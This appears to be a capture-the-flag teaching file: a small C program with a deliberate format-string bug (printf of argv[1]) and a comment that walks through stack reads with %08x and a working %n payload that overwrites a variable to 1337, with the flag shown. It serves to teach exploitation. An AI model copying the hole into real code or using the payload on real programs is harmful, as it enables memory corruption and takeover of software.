/*
 * Use this file to test the concept
 * 
 * You are jumping across memory registers until you get to the memory location of the secret. It depends on the computer and requires a bit of guessing.
 * Start from %08x.%08x.%08x. and so on and have a %s at the end to print the value at the memory location. You should see nothing after the . when it prints out the value of secret as a string. Once you have this, you change %s to %n to start writing to the secret. Print out 1337 characters randomly without altering the formatting string and wala, you should get access to the shell!
 *
 * > ./format %1291x.%08x.%08x.%08x.%08x.%08x.%n
 * > cat flag.txt
 * who_thought_%n_was_a_good_idea?
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int secret = 0;

int main(int argc, char **argv){
    int *ptr = &secret;
    printf(argv[1]);
    printf("\n%p\n", ptr);
    printf("\n%d\n", secret);

    if (secret == 1337){
        printf("Success!");
        //give_shell();
    }
    return 0;
}
